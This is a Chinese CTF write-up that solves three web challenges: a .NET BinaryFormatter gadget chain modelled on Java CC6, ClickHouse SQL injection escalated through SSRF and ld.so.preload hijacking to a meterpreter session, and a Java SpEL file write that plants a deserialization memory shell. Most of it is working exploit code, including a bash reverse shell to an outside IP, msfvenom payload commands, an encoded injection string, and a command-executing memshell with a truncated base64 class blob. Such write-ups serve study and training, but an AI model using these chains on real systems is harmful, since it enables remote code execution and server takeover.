using System.Runtime.Serialization.Formatters.Binary;

namespace Ezdotnet.Utils;

public class MyBinaryFormatter
{
    public void Deserialize(String base64String)
    {
        AppContext.SetSwitch("Switch.System.Data.AllowArbitraryDataSetTypeInstantiation", true);
        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation", true);
        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowAssembliesFromByteArrays", true);
        byte[] bytes = Convert.FromBase64String(base64String);

        using (MemoryStream stream = new MemoryStream(bytes))
        {
            BinaryFormatter formatter = new BinaryFormatter();
            object deserializedObject = formatter.Deserialize(stream);
            
        }
    }

    public MyBinaryFormatter()
    {
        
    }
}
```



开启了三个不安全的选项，并且题目给了3个Bean，分别如下

+  Badbean 

```c
namespace Ezdotnet.Beans;
[Serializable]
public class BadBean
{
    private Transformer _transformer=new InvokerTransformer();

    public BadBean()
    {
        _transformer.methodName = "DASCTF";
        _transformer.methodParam = new object[] { "Welcome To HDCTF" };
        _transformer.typeName = "Ezdotnet.Beans.GoodBean";
    }

    public override string ToString()
    {
        var goodBean = new GoodBean();
        _transformer.transform(goodBean);
        return base.ToString();
    }
}
```

 

+  ChainedTransformer 

```c
namespace Ezdotnet.Beans;

[Serializable]
public class ChainedTransformer: Transformer
{
    public object transform(object o)
    {   
        for(int i = 0; i < this._transformers.Length; ++i) {
            o = this._transformers[i].transform(o);
        }

        return o;
    }
    public string typeName { get; set; }
    public object[] methodParam { get; set; }
    public string methodName { get; set; }
    public InvokerTransformer[] _transformers { get; set; }
}
```

 

+  InvokerTransfomer 

```c
using System.Reflection;

namespace Ezdotnet.Beans;
[Serializable]
public class InvokerTransformer: Transformer
{ public object transform(object o)
    {
        try
        {
            var type = o.GetType();
            var methodInfo = type.GetMethod(this.methodName,new Type[]{typeof(byte[])});
            if (methodInfo != null)
            {
                return methodInfo.Invoke(o, this.methodParam);
            }
            else
            {
                type = Type.GetType(typeName);
                methodInfo = type.GetMethod(this.methodName,new Type[]{typeof(byte[])});
                if (methodInfo==null)
                {
                    methodInfo = type.GetMethod(methodName, new Type[] { typeof(string) });
                }
                return methodInfo.Invoke(o, this.methodParam);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            throw;
        }
    }

    public object[] methodParam { get; set; }
    public string methodName { get; set; }
    
    public InvokerTransformer[] _transformers { get; set; }
    public string typeName { get; set; }
}
```

 



观察这上面三个类其实你不难发现这是一个CommonColelctions6的仿链。也就是说我们要在dotnet里实现类似Java cc6的反序列化利用链，那我们来进行一步步的题解吧。



**不安全的Binder**

```c
using System.Runtime.Serialization;
using Ezdotnet.Beans;

namespace Ezdotnet.Utils;

public class SecurityBinder:SerializationBinder
{
    public override Type? BindToType(string assemblyName, string typeName)
    {
        Console.WriteLine($"assemblyName:{assemblyName},typeName:{typeName}.");
        Type typeToDeserialize = Type.GetType(String.Format("{0}, {1}", typeName, assemblyName));

        if (typeToDeserialize == typeof(InvokerTransformer) || typeToDeserialize==typeof(ChainedTransformer))
        {
            Console.WriteLine("can't deseriliza rce class.");
            return null;
        }
        return typeToDeserialize;
    }
}
```



Binder的逻辑如上，表面上可以看到假如识别到了我们2个恶意类就会拦截，但这里实际上就只是起一个障眼法的作用，虽然会被拦截，但我们的反序列化依旧会进行，不会终止。



**利用链**

那么我们如何利用chainedTransformer和InvokerTransformer去进一步的Rce呢，这里联想到Linq利用链其实并不难想象到，我们只需要进行一个ddl加载就行了。大致的方法调用如下

```c
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;

namespace DonNET_Deserialization;

public class TEST
{
    public static void Main(string[] args)
    {
        var assembly = Assembly.Load(File.ReadAllBytes("ExpClassa.dll"));
        var types = assembly.GetTypes();
        Activator.CreateInstance(types[0]);
    }
}
```



一个简单的Demo如上，那么我们也只需要仿照上述写出一个ChainedTransformer即可

```c
var invokerTransformer1 = new InvokerTransformer();
        invokerTransformer1.methodName = "Load";
        invokerTransformer1.methodParam = new object[] {Convert.FromBase64String("<base64>")};
        invokerTransformer1.typeName = "System.Reflection.Assembly";
        var invokerTransformer2 = new InvokerTransformer();
        invokerTransformer2.methodName = "CreateInstance";
        invokerTransformer2.typeName = "System.Reflection.Assembly";
        invokerTransformer2.methodParam = new object[] { "Exp.Exp" };   
        ChainedTransformer chainedTransformer = new ChainedTransformer();
```



如上述构造我们就可以通过反射一步步的去加载任意类了。



**ToString 触发点**

从上面的BadBean可以看到，触发点是在toString的，也就是要找到反序列化时候触发Tostring的方法，学过ActivitySurrogateSelector利用链的应该都知道，HashTable在反序列化时候回进行键值对重构，假如有异常就会触发ToString。那么最终链子如下

```c
using System.Collections;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using Ezdotnet.Beans;
using Ezdotnet.Utils;

namespace MyNamespace;

public class Demo
{
    public static void Main(string[] args)
    {
        var invokerTransformer1 = new InvokerTransformer();
        invokerTransformer1.methodName = "Load";
        invokerTransformer1.methodParam = new object[] {Convert.FromBase64String("<base64>")};
        invokerTransformer1.typeName = "System.Reflection.Assembly";
        var invokerTransformer2 = new InvokerTransformer();
        invokerTransformer2.methodName = "CreateInstance";
        invokerTransformer2.typeName = "System.Reflection.Assembly";
        invokerTransformer2.methodParam = new object[] { "Exp.Exp" };   
        ChainedTransformer chainedTransformer = new ChainedTransformer();
        chainedTransformer._transformers = new InvokerTransformer[] { invokerTransformer1, invokerTransformer2 };
        var badBean = new BadBean();
        var filed = badBean.GetType().GetField("_transformer",BindingFlags.NonPublic | BindingFlags.Instance);
        filed.SetValue(badBean,chainedTransformer);
        // chainedTransformer.transform(new object());
        var ht = new Hashtable();
        ht.Add(badBean, "");
        ht.Add("", "");
        FieldInfo fi_keys = ht.GetType().GetField("_buckets", BindingFlags.NonPublic | BindingFlags.Instance);
        Array keys = (Array)fi_keys.GetValue(ht);
        FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
        for (int i = 0; i < keys.Length; ++i)
        {
            object bucket = keys.GetValue(i);
            object key = fi_key.GetValue(bucket);
            if (key is string)
            {
                fi_key.SetValue(bucket, badBean);
                keys.SetValue(bucket, i);
                break;
            }
        }

        fi_keys.SetValue(ht, keys);
        
        BinaryFormatter formatter = new BinaryFormatter();
        var securityBinder = new SecurityBinder();
        formatter.Binder = securityBinder;
        byte[] binaryData;
        using (MemoryStream stream = new MemoryStream())
        {
            formatter.Serialize(stream, ht);
            binaryData = stream.ToArray();
            
            // 将流位置重置为开始
            // stream.Seek(0, SeekOrigin.Begin);
            // formatter.Deserialize(stream);
        }

        string base64String = Convert.ToBase64String(binaryData);
        Console.WriteLine(base64String);
        // var myBinaryFormatter = new MyBinaryFormatter();
        // myBinaryFormatter.Deserialize(base64String);
    }
}
```



恶意dll中class的内容如下



```c
using System.Diagnostics;

namespace Exp;

public class Exp
{
    public Exp()
    {
        Process.Start("/bin/bash", "-c \"bash -i >& /dev/tcp/8.130.24.188/7778 <&1\"").WaitForExit();
    }
}
```

将生成的base64输入后即可收到反弹shell

## 题目：RceHouse
解题步骤

审计一下源码

```python

import subprocess
import clickhouse_connect
from flask import *
import os

app = Flask(__name__)
client = clickhouse_connect.get_client(host='127.0.0.1', port=8123, username='default', password='')
@app.route("/status",methods=['POST'])
def status():
    if request.method=="POST":
        remote_addr = request.remote_addr
        print(remote_addr)
        if remote_addr=='127.0.0.1':
            command = ["clickhouse-client", "--query", request.args.get('param') ]
            result = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True,shell=False)
            return result
        else:
            result=os.popen(f"clickhouse-client --query=\"select 'try harder'\"").read()
            return result
    else:
        result = os.popen(f"clickhouse-client --query=\"select 'try better'\"").read()
        return result
@app.route("/sql", methods=["POST"])
def sql():
    try:
        #此处是clickhouse的查询语法，不存在注入问题
        sql = 'SELECT * FROM ctf.users WHERE id = ' + request.form.get("id")
        res=client.command(sql)
        client.close()
        return res
    except Exception as e:
        return e;
@app.route("/upload",methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect(request.url)

    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    filename = "Boogipop"
    file_path ="/tmp/"+filename
    file.save(file_path)
    return file_path

if __name__=="__main__":
    app.run("0.0.0.0",5000,debug=False)
```



是一个clickhouse服务，并且给了一个文件上传接口，Dockerfile也给出

```dockerfile
FROM bitnami/clickhouse:latest

USER root
COPY src/start.sh /start.sh
COPY src/flag.sh /flag.sh
COPY src/db.sql /docker-entrypoint-initdb.d/db.sql
COPY src /app
ENV CLICKHOUSE_ADMIN_PASSWORD default
ENV DASFLAG DASCTF{test_flag}
WORKDIR /app
RUN sed -i "s@http://deb.debian.org@http://mirrors.aliyun.com@g" /etc/apt/sources.list
RUN mkdir -p /var/lib/apt/lists/partial&&\
    apt-get clean&&\
    apt-get update&&\
    apt-get install -y python3-pip sudo &&\
    python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple flask clickhouse_connect && \
    sed -i "s@http://deb.debian.org@http://mirrors.aliyun.com@g" /etc/apt/sources.list
EXPOSE 5000

CMD ["/start.sh"]
```



可以发现是root权限运行的。其实到这里不难想到往etc目录写文件。难点在于如何实现



查询官方文档后可以发现ClickHouse是存在Web Http Interface APi的

```shell
 curl 'http://localhost:8123/?query=SELECT%201'
1

$ wget -nv -O- 'http://localhost:8123/?query=SELECT 1'
1

$ echo -ne 'GET /?query=SELECT%201 HTTP/1.0\r\n\r\n' | nc localhost 8123
HTTP/1.0 200 OK
Date: Wed, 27 Nov 2019 10:30:18 GMT
Connection: Close
Content-Type: text/tab-separated-values; charset=UTF-8
X-ClickHouse-Server-Display-Name: clickhouse.ru-central1.internal
X-ClickHouse-Query-Id: 5abe861c-239c-467f-b955-8a201abb8b7f
X-ClickHouse-Summary: {"read_rows":"0","read_bytes":"0","written_rows":"0","written_bytes":"0","total_rows_to_read":"0","elapsed_ns":"662334"}

1
```



我们可以利用这个api执行任意的query指令，那么如何访问到这个api呢，这就是开始的入口点注入了

```sql
 sql = 'SELECT * FROM ctf.users WHERE id = ' + request.form.get("id")
```



这里的语句存在sql注入，然后通过查询clickhouse官方文档发现他存在url函数



官方demo如下：

```sql
CREATE TABLE test_table (column1 String, column2 UInt32) ENGINE=Memory;
INSERT INTO FUNCTION url('http://127.0.0.1:8123/?query=INSERT+INTO+test_table+FORMAT+CSV', 'CSV', 'column1 String, column2 UInt32') VALUES ('http interface', 42);
SELECT * FROM test_table;
```



是可以实现ssrf的。他可以访问内网的一个地址，因此思路很简单，利用ssrf去访问clickhouse的webapi，最终执行任意sql语句，clickhouse是有`into outfile`语句的，因此可以写入任意文件。那么思路如下



+ 上传so文件到tmp目录
+ 通过ssrf执行into outfile语句写入ld.so.preload文件
+ 劫持LD_PRELOAD上线msf



首先使用msfvenom生成一个payload

```plain
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<your port> -f elf-so > shell.elf
```



最终payload如下



```plain
id=1 and (select * from url('http://127.0.0.1:8123/?query=%2569%256e%2573%2565%2572%2574%2520%2569%256e%2574%256f%2520%2566%2575%256e%2563%2574%2569%256f%256e%2520%2575%2572%256c%2528%2527%2568%2574%2574%2570%253a%252f%252f%2531%2532%2537%252e%2530%252e%2530%252e%2531%253a%2535%2530%2530%2530%252f%2573%2574%2561%2574%2575%2573%253f%2570%2561%2572%2561%256d%253d%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2538%2525%2536%2535%2525%2537%2538%2525%2532%2538%2525%2532%2537%2525%2533%2532%2525%2536%2536%2525%2533%2537%2525%2533%2534%2525%2533%2536%2525%2536%2534%2525%2533%2537%2525%2533%2530%2525%2533%2532%2525%2536%2536%2525%2533%2534%2525%2533%2532%2525%2533%2536%2525%2536%2536%2525%2533%2536%2525%2536%2536%2525%2533%2536%2525%2533%2537%2525%2533%2536%2525%2533%2539%2525%2533%2537%2525%2533%2530%2525%2533%2536%2525%2536%2536%2525%2533%2537%2525%2533%2530%2525%2532%2537%2525%2532%2539%2525%2532%2530%2525%2536%2539%2525%2536%2565%2525%2537%2534%2525%2536%2566%2525%2532%2530%2525%2536%2566%2525%2537%2535%2525%2537%2534%2525%2536%2536%2525%2536%2539%2525%2536%2563%2525%2536%2535%2525%2532%2530%2525%2532%2537%2525%2532%2566%2525%2536%2535%2525%2537%2534%2525%2536%2533%2525%2532%2566%2525%2536%2563%2525%2536%2534%2525%2532%2565%2525%2537%2533%2525%2536%2566%2525%2532%2565%2525%2537%2530%2525%2537%2532%2525%2536%2535%2525%2536%2563%2525%2536%2566%2525%2536%2531%2525%2536%2534%2525%2532%2537%2527%252c%2527%2543%2553%2556%2527%252c%2527%2561%2520%2553%2574%2572%2569%256e%2567%2527%2529%2520%2576%2561%256c%2575%2565%2573%2520%2528%2527%2570%256f%2570%2527%2529','CSV','a String'))
```



最终在MSFCONSOLE可以收到meterpreter直接读取flag

```plain
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 9919
lport => 9919
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 0.0.0.0:9919
```



```plain
meterpreter > ls
Listing: /
==========

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040755/rwxr-xr-x  4096   dir   2024-04-14 13:33:17 +0800  .cache
100600/rw-------  44     fil   2024-04-14 13:35:56 +0800  .clickhouse-client-history
100755/rwxr-xr-x  0      fil   2024-04-14 13:34:01 +0800  .dockerenv
040755/rwxr-xr-x  4096   dir   2024-04-14 13:34:16 +0800  app
040755/rwxr-xr-x  12288  dir   2024-04-14 13:33:15 +0800  bin
040755/rwxr-xr-x  4096   dir   2024-04-06 06:23:05 +0800  bitnami
040755/rwxr-xr-x  4096   dir   2024-01-29 05:20:00 +0800  boot
040755/rwxr-xr-x  340    dir   2024-04-14 13:34:02 +0800  dev
040775/rwxrwxr-x  4096   dir   2024-04-14 13:32:32 +0800  docker-entrypoint-initdb.d
040775/rwxrwxr-x  4096   dir   2024-04-06 06:23:05 +0800  docker-entrypoint-startdb.d
040755/rwxr-xr-x  4096   dir   2024-04-14 13:36:23 +0800  etc
040755/rwxr-xr-x  4096   dir   2024-01-29 05:20:00 +0800  home
040755/rwxr-xr-x  4096   dir   2024-04-14 13:33:10 +0800  lib
040755/rwxr-xr-x  4096   dir   2024-03-28 17:52:12 +0800  lib64
040755/rwxr-xr-x  4096   dir   2024-03-28 17:52:12 +0800  media
040755/rwxr-xr-x  4096   dir   2024-03-28 17:52:12 +0800  mnt
040775/rwxrwxr-x  4096   dir   2024-04-06 06:22:55 +0800  opt
040555/r-xr-xr-x  0      dir   2024-04-14 13:34:02 +0800  proc
040700/rwx------  4096   dir   2024-03-28 17:52:12 +0800  root
040755/rwxr-xr-x  4096   dir   2024-03-28 17:52:12 +0800  run
040775/rwxrwxr-x  4096   dir   2024-04-14 13:33:03 +0800  sbin
040755/rwxr-xr-x  4096   dir   2024-03-28 17:52:12 +0800  srv
100755/rwxr-xr-x  598    fil   2024-04-14 13:32:11 +0800  start.sh
040555/r-xr-xr-x  0      dir   2024-02-22 12:17:31 +0800  sys
041777/rwxrwxrwx  4096   dir   2024-04-14 13:36:08 +0800  tmp
040775/rwxrwxr-x  4096   dir   2024-04-06 06:22:46 +0800  usr
040755/rwxr-xr-x  4096   dir   2024-04-06 06:23:04 +0800  var
100644/rw-r--r--  18     fil   2024-04-14 13:34:02 +0800  wh3re_1s_f14g

meterpreter > cat wh3re_1s_f14g 
DASCTF{test_flag}
```

## 题目：ImpossibleUnser
**解题步骤**

```java
package com.ctf;
import java.net.InetSocketAddress;
import com.sun.net.httpserver.HttpServer;
public class IndexController {
    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(8000), 0);
        server.createContext("/ctf", new SPELHandler());
        server.createContext("/index", new IndexHandler());
        server.createContext("/unser", new UnserHandler());
        server.setExecutor(null);
        server.start();
    }
}
```



审计源码可以发现有3个路由，其中index路由会列出/usr/lib/jvm/java-8-openjdk-amd64/jre目录文件



```java
package com.ctf;

import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;

public class IndexHandler implements HttpHandler {
    @Override
    public void handle(HttpExchange exchange) throws IOException {
        OutputStream os = exchange.getResponseBody();
        List<String> files = listFilesInDirectory("/usr/lib/jvm/java-8-openjdk-amd64/jre");
        StringBuilder response = new StringBuilder();

        for (String file : files) {
            response.append(file).append("\n");
        }

        byte[] responseData = response.toString().getBytes();
        int chunkSize = 1024; // 设置每个数据块的大小

        exchange.sendResponseHeaders(200, responseData.length);

        int offset = 0;
        while (offset < responseData.length) {
            int bytesToWrite = Math.min(chunkSize, responseData.length - offset);
            os.write(responseData, offset, bytesToWrite);
            offset += bytesToWrite;
        }

        os.close();
    }
    private List<String> listFilesInDirectory(String directoryPath) {
        File directory = new File(directoryPath);
        File[] files = directory.listFiles();

        if (files != null) {
            return Arrays.asList(directory.list());
        } else {
            return null;
        }
    }
}
```



会发现jre下有classes目录，然后unser路由就是一个反序列化入口



```java
 public void handle(HttpExchange httpExchange) throws IOException {
        InputStream requestBody = httpExchange.getRequestBody();
        String body = readInputStream(requestBody);
        if (!body.equals("")){
            Map<String, String> PostData = parseFormData(body);
            String payload=PostData.get("unser");
            payload= URLDecoder.decode(payload);
            try {
                base64deserial(payload);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            String response="Welcome to My Challenge";
            httpExchange.sendResponseHeaders(200, response.length());
            OutputStream os = httpExchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
        String response = "Give me some payload Plz Unser me";
        httpExchange.sendResponseHeaders(200, response.length());
        OutputStream os = httpExchange.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
```



但是没有任何的依赖和利用链



并且还存在一个SPEL注入的入口，但是做了过滤，无法直接rce



这里就需要配合SPEL去写一个恶意的class文件到jre/classes目录下，构造的恶意类如下



```java
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class EvilMemshell implements Serializable, HttpHandler {
    private  void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException {
        try{
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsFeld = threadGroup.getClass().getDeclaredField("threads");
            threadsFeld.setAccessible(true);
            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);
            Thread thread = threads[1];

            Field targetField = thread.getClass().getDeclaredField("target");
            targetField.setAccessible(true);
            Object object = targetField.get(thread);

            Field this$0Field = object.getClass().getDeclaredField("this$0");
            this$0Field.setAccessible(true);
            object = this$0Field.get(object);

            Field contextsField = object.getClass().getDeclaredField("contexts");
            contextsField.setAccessible(true);
            object = contextsField.get(object);

            Field listField = object.getClass().getDeclaredField("list");
            listField.setAccessible(true);
            java.util.LinkedList linkedList = (java.util.LinkedList)listField.get(object);
            object = linkedList.get(0);

            Field handlerField = object.getClass().getDeclaredField("handler");
            handlerField.setAccessible(true);
            handlerField.set(object,this);
        }catch(Exception exception){
        }
    }
    public static String base64serial(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void main(String[] args) throws Exception {
        System.out.println(base64serial(new EvilMemshell()));
    }

    @Override
    public void handle(HttpExchange httpExchange) throws IOException {
        String query = httpExchange.getRequestURI().getQuery();
        String[] split = query.split("=");
        String response = "SUCCESS"+"\n";
        if (split[0].equals("shell")) {
            String cmd = split[1];
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            byte[] bytes = new byte[1024];
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int flag=-1;
            while((flag=inputStream.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,flag);
            }
            response += byteArrayOutputStream.toString();
            byteArrayOutputStream.close();
        }
        httpExchange.sendResponseHeaders(200,response.length());
        OutputStream outputStream = httpExchange.getResponseBody();
        outputStream.write(response.getBytes());
        outputStream.close();
    }
}
```



配合SPEL写入



```plain
payload=T(com.sun.org.apache.xml.internal.security.utils.JavaUtils).writeBytesToFilename("/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/EvilMemshell.class",T(java.util.Base64).getDecoder.decode("yv66vgAAADQA6QoAOQBXCgBYAFkKAFgAWgoAOQBbCABcCgBdAF4KAF8AYAoAXwBhBwBiCABjCABkCABlCABmBwBnCgAOAGgIAGkKAF8AagcAawcAbAoAEwBXBwBtCgAVAG4KABUAbwoAFQBwCgBxAHIKABMAcwoAdAB1CQB2AHcHAHgKAB0AVwoAHQB5CgB6AHsKAHwAfQoAfgB/CACACgCBAIIIAIMIAIQKAIEAhQoAhgCHCgCGAIgKAIkAigoAiwCMCgATAI0HAI4KAC0AVwoALQCPCgATAJAKAC0AkAoAEwBwCgCBAJEKAHwAkgoAfACTCgCBAJQKAJUAlgoAlQBwBwCXBwCYBwCZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAA1TdGFja01hcFRhYmxlBwBrAQAKRXhjZXB0aW9ucwcAmgcAmwcAnAEADGJhc2U2NHNlcmlhbAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAZoYW5kbGUBACgoTGNvbS9zdW4vbmV0L2h0dHBzZXJ2ZXIvSHR0cEV4Y2hhbmdlOylWBwB4BwCdBwCeBwCfBwCgBwChBwBsAQAKU291cmNlRmlsZQEAEUV2aWxNZW1zaGVsbC5qYXZhDAA8AD0HAKIMAKMApAwApQCmDACnAKgBAAd0aHJlYWRzBwCpDACqAKsHAKwMAK0ArgwArwCwAQATW0xqYXZhL2xhbmcvVGhyZWFkOwEABnRhcmdldAEABnRoaXMkMAEACGNvbnRleHRzAQAEbGlzdAEAFGphdmEvdXRpbC9MaW5rZWRMaXN0DACvALEBAAdoYW5kbGVyDACyALMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BABpqYXZhL2lvL09iamVjdE91dHB1dFN0cmVhbQwAPAC0DAC1ALYMALcAPQcAuAwAuQC8DAC9AL4HAL8MAMAAwQcAwgwAwwDEAQAMRXZpbE1lbXNoZWxsDABIAEkHAMUMAMYAxwcAnQwAyADJBwDKDADLAMwBAAE9BwCeDADNAM4BAAhTVUNDRVNTCgEABXNoZWxsDADPANAHANEMANIA0wwA1ADVBwDWDADXANgHAKAMANkA2gwA2wDcAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAN0A3gwA3wDMDADgAOEMAOIA4wwA5ADlDADmAL4HAOcMANsA6AEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAImNvbS9zdW4vbmV0L2h0dHBzZXJ2ZXIvSHR0cEhhbmRsZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BACNjb20vc3VuL25ldC9odHRwc2VydmVyL0h0dHBFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQALd3JpdGVPYmplY3QBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAVjbG9zZQEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBAAt0b0J5dGVBcnJheQEABCgpW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1nZXRSZXF1ZXN0VVJJAQAQKClMamF2YS9uZXQvVVJJOwEADGphdmEvbmV0L1VSSQEACGdldFF1ZXJ5AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEABmxlbmd0aAEAAygpSQEAE3NlbmRSZXNwb25zZUhlYWRlcnMBAAUoSUopVgEAD2dldFJlc3BvbnNlQm9keQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGdldEJ5dGVzAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAUoW0IpVgAhAB0AOQACADoAOwAAAAUAAQA8AD0AAQA+AAAAHQABAAEAAAAFKrcAAbEAAAABAD8AAAAGAAEAAAAIAAIAQABBAAIAPgAAAUoAAwANAAAAv7gAArYAA00stgAEEgW2AAZOLQS2AActLLYACMAACcAACToEGQQEMjoFGQW2AAQSCrYABjoGGQYEtgAHGQYZBbYACDoHGQe2AAQSC7YABjoIGQgEtgAHGQgZB7YACDoHGQe2AAQSDLYABjoJGQkEtgAHGQkZB7YACDoHGQe2AAQSDbYABjoKGQoEtgAHGQoZB7YACMAADjoLGQsDtgAPOgcZB7YABBIQtgAGOgwZDAS2AAcZDBkHKrYAEacABE2xAAEAAAC6AL0AEgACAD8AAABiABgAAAALAAcADAARAA0AFgAOACMADwApABEANQASADsAEwBEABUAUAAWAFYAFwBfABkAawAaAHEAGwB6AB0AhgAeAIwAHwCYACAAoAAiAKwAIwCyACQAugAmAL0AJQC+ACcAQgAAAAkAAvcAvQcAQwAARAAAAAgAAwBFAEYARwAJAEgASQACAD4AAABTAAMABAAAACe7ABNZtwAUTLsAFVkrtwAWTSwqtgAXLLYAGLgAGSu2ABq2ABtOLbAAAAABAD8AAAAaAAYAAAApAAgAKgARACsAFgAsABoALgAlAC8ARAAAAAQAAQASAAkASgBLAAIAPgAAAC0AAwABAAAAEbIAHLsAHVm3AB64AB+2ACCxAAAAAQA/AAAACgACAAAANAAQADUARAAAAAQAAQASAAEATABNAAIAPgAAAT0ABAAKAAAAnyu2ACG2ACJNLBIjtgAkThIlOgQtAzISJrYAJ5kAYS0EMjoFuAAoGQW2ACm2ACo6BhEEALwIOge7ABNZtwAUOggCNgkZBhkHtgArWTYJAp8AEBkIGQcDFQm2ACyn/+i7AC1ZtwAuGQS2AC8ZCLYAMLYAL7YAMToEGQi2ADIrEQDIGQS2ADOFtgA0K7YANToFGQUZBLYANrYANxkFtgA4sQAAAAIAPwAAAEoAEgAAADkACAA6AA8AOwATADwAHgA9ACMAPgAwAD8ANwBAAEAAQQBDAEIAUQBDAF4ARQB3AEYAfABIAIkASQCPAEoAmQBLAJ4ATABCAAAAPAAD/wBDAAoHAE4HAE8HAFAHAFEHAFAHAFAHAFIHAFMHAFQBAAAa/wAdAAUHAE4HAE8HAFAH